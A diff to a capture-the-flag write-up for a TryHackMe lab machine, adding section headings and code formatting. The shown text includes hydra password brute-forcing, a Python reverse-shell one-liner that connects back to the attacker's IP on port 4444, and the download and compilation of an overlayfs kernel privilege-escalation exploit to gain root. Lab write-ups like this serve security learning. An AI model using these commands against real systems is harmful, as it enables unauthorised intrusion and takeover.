@@ -1,5 +1,8 @@
+## Medium THM box
+
 `Machine ip: xx.xx.xxx.xx`
 
+## Enumeration
 Running a nmap scan on the target we get the open ports:
 
 `Open Ports:
@@ -42,6 +45,8 @@ We got the password but the mail said:
 **Make sure to edit your host file since you usually work remote off-network....
 Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.`
 
+## Exploitation
+
 So we add \<machine_ip\> severnaya-station.com/gnocertdir to our /etc/hosts to access it on the browser.
 
 Now logging as xenia in that website. According to tryhackme, we need to find another user. He is named doak. We try to brute-force his password again using hydra. 
@@ -69,26 +74,28 @@ We also need to change the spell engine to *PspellShell* that's after googling I
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-Listening to the port on our system we get a shell. To find the kernal version we use _uname -a_.
+Listening to the port on our system we get a shell. To find the kernal version we use `uname -a`.
+
+## Priv Esc
 
 The kernel version is 3.13.0-32-generic which is a very outdated kernel so exploit.db must have a priv esc script. There is [one](https://www.exploit-db.com/exploits/37292) and then download it onto the vm server
 using python simple http server and wget.
 
-_python -m SimpleHTTPServer_
+`python -m SimpleHTTPServer`
 
 Trying to compile the code using `gcc` we find that `gcc` is not installed but cc is.
 
 So all we need to do is to replace `gcc` by `cc` in the exploit.
 
-_sed -i "s/gcc/cc/g" overlayfs.c_
+`sed -i "s/gcc/cc/g" overlayfs.c`
 
 Now we compile and run this to get root access.
 
-_cc overlayfs.c -o root_access_
-_./root_access_
+`cc overlayfs.c -o root_access`
+`./root_access`
 
 We get some warnings but we can ignore them for now as we're root already.
 
 Now nagvigate over to the root floder and `cat` the hidden root flag.
 
-#And We're Done!
+# And We're Done!
